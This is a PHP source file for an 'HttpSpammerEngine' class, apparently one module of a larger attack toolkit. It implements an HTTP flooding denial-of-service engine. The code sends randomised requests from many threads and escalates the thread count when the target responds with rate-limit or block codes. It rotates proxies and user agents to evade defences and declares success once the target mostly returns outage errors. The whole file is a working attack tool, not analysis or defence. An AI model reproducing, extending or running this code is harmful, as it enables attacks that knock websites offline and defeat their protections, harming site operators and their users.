<?php

$stealthDependencies = [
    __DIR__ . '/../stealth_engine_class.php',
    __DIR__ . '/../client_profile_class.php',
    __DIR__ . '/../tls_profile_class.php',
    __DIR__ . '/../proxy_manager_class.php'
];

foreach ($stealthDependencies as $dep) {
    if (file_exists($dep)) {
        try {
            require_once $dep;
        } catch (Exception $e) {
        }
    }
}

class HttpSpammerEngine {
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'threads' => 500,
            'duration' => 3600,
            'requests_per_thread' => 100,
            'request_delay' => 0.01,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'escalation_factor' => 1.5,
            'resistance_threshold' => 0.3,
            'http_methods' => ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'],
            'payload_size' => 1024
        ], $config);
    }
    
    public function start($target, $groupId, $profile) {
        $this->logMessage("Starting HTTP Spammer attack on $target with group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $startTime = time();
        $totalRequests = 0;
        $successCount = 0;
        $errorCodes = [];
        $currentThreads = $this->config['threads'];
        $bytesTransferred = 0;
        
        while (true) {
            if (time() - $startTime >= $this->config['duration']) {
                $this->logMessage("Maximum duration reached for group: $groupId");
                break;
            }
            
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                $batchResults = $this->executeSpamBatch($target, $groupId, $profile);
                
                $totalRequests += $batchResults['requests'];
                $successCount += $batchResults['success'];
                $bytesTransferred += $batchResults['bytes'];
                
                foreach ($batchResults['error_codes'] as $code => $count) {
                    $errorCodes[$code] = ($errorCodes[$code] ?? 0) + $count;
                }
                
                if ($this->config['stealth_enabled'] && $totalRequests % 200 === 0) {
                    $this->rotateStealthComponents();
                }
            }
            
            if ($this->shouldEscalate($errorCodes, $totalRequests)) {
                $currentThreads = min($currentThreads * $this->config['escalation_factor'], 20000);
                $this->logMessage("Escalated threads to $currentThreads for $target");
            }
            
            usleep($this->config['request_delay'] * 1000000);
        }
        
        return [
            'total_requests' => $totalRequests,
            'success_count' => $successCount,
            'error_codes' => $errorCodes,
            'bytes_transferred' => $bytesTransferred,
            'duration' => time() - $startTime,
            'threads_used' => $currentThreads
        ];
    }
    
    private function executeSpamBatch($target, $groupId, $profile) {
        $requests = 0;
        $success = 0;
        $errorCodes = [];
        $bytes = 0;
        
        for ($i = 0; $i < $this->config['requests_per_thread']; $i++) {
            $method = $this->config['http_methods'][array_rand($this->config['http_methods'])];
            $result = $this->performHttpRequest($target, $method);
            
            $requests++;
            $bytes += $result['bytes'];
            
            if ($result['success']) {
                $success++;
            } else {
                $code = $result['status_code'];
                $errorCodes[$code] = ($errorCodes[$code] ?? 0) + 1;
            }
        }
        
        return [
            'requests' => $requests,
            'success' => $success,
            'error_codes' => $errorCodes,
            'bytes' => $bytes
        ];
    }
    
    private function performHttpRequest($target, $method = 'GET') {
        $parsedUrl = parse_url($target);
        $host = $parsedUrl['host'] ?? $target;
        $path = $parsedUrl['path'] ?? '/';
        $port = $parsedUrl['port'] ?? ($parsedUrl['scheme'] === 'https' ? 443 : 80);
        
        $userAgent = $this->clientProfile ? $this->clientProfile->getCurrentUserAgent() : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        
        $headers = [
            "User-Agent: $userAgent",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: close",
            "Cache-Control: no-cache",
            "Pragma: no-cache"
        ];
        
        $postData = '';
        if (in_array($method, ['POST', 'PUT'])) {
            $postData = $this->generateSpamPayload();
            $headers[] = "Content-Type: application/x-www-form-urlencoded";
            $headers[] = "Content-Length: " . strlen($postData);
        }
        
        $contextOptions = [
            'http' => [
                'method' => $method,
                'header' => implode("\r\n", $headers),
                'content' => $postData,
                'timeout' => 10,
                'ignore_errors' => true
            ]
        ];
        
        if ($this->config['proxy_rotation'] && $this->proxyManager) {
            $proxy = $this->proxyManager->getCurrentProxy();
            if ($proxy) {
                $contextOptions['http']['proxy'] = "tcp://{$proxy['ip']}:{$proxy['port']}";
                $contextOptions['http']['request_fulluri'] = true;
            }
        }
        
        $context = stream_context_create($contextOptions);
        $startTime = microtime(true);
        $response = file_get_contents($target, false, $context);
        $endTime = microtime(true);
        
        $statusCode = 200;
        if (isset($http_response_header)) {
            $statusLine = $http_response_header[0];
            preg_match('/HTTP\/\d\.\d\s+(\d+)/', $statusLine, $matches);
            if (isset($matches[1])) {
                $statusCode = (int)$matches[1];
            }
        }
        
        $bytes = strlen($response ?: '') + strlen(implode("\r\n", $headers)) + strlen($postData);
        $success = $statusCode >= 200 && $statusCode < 400;
        
        return [
            'success' => $success,
            'status_code' => $statusCode,
            'bytes' => $bytes,
            'response_time' => $endTime - $startTime,
            'response' => $response
        ];
    }
    
    private function generateSpamPayload() {
        $payloadSize = $this->config['payload_size'];
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $payload = '';
        
        for ($i = 0; $i < $payloadSize; $i++) {
            $payload .= $chars[rand(0, strlen($chars) - 1)];
        }
        
        return "data=" . urlencode($payload) . "&spam=1&timestamp=" . time();
    }
    
    private function shouldEscalate($errorCodes, $requestCount) {
        if ($requestCount < 100) return false;
        
        $blockCodes = [403, 429, 503];
        $blockCount = 0;
        
        foreach ($blockCodes as $code) {
            $blockCount += $errorCodes[$code] ?? 0;
        }
        
        $blockRate = $blockCount / $requestCount;
        return $blockRate > $this->config['resistance_threshold'];
    }
    
    private function initializeStealth($groupId) {
        try {
            if (class_exists('StealthEngine')) {
                $this->stealthEngine = new StealthEngine([
                    'session_id' => "http_spammer_$groupId",
                    'stealth_level' => 'maximum',
                    'rotation_interval' => 20
                ]);
            }
            
            if (class_exists('ClientProfile')) {
                $this->clientProfile = new ClientProfile();
            }
            
            if (class_exists('TLSProfile')) {
                $this->tlsProfile = new TLSProfile();
            }
            
            if (class_exists('ProxyManager')) {
                $this->proxyManager = new ProxyManager();
            }
            
            $this->logMessage("Initialized available stealth components for HTTP Spammer group: $groupId");
        } catch (Exception $e) {
            $this->logMessage("Stealth initialization failed, continuing without stealth: " . $e->getMessage());
            $this->config['stealth_enabled'] = false;
        }
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] HTTP_SPAMMER_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}
